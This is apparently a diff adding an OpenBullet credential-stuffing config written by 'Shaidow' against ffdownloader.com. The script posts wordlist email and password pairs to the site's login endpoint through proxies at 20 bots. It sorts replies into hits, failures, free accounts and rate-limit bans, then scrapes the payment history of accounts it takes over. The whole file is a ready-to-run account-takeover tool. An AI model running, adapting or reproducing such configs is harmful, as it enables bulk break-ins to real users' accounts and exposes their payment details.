@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "ffdownloader",
+  "SuggestedBots": 20,
+  "LastModified": "2019-04-03T08:03:39.8152139+02:00",
+  "AdditionalInfo": "",
+  "Author": "Shaidow",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://ffdownloader.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#login_check REQUEST POST "https://ffdownloader.com/login_check" 
+  CONTENT "_email=<USER>&_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Bad credentials." 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Buy premium access" 
+  KEYCHAIN Ban OR 
+    KEY "Attempt ended, try again after 10 minutes" 
+REQUEST GET "https://ffdownloader.com/profile/payments" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<h1>Payment history</h1>" "</div>" -> VAR "Payment history" 
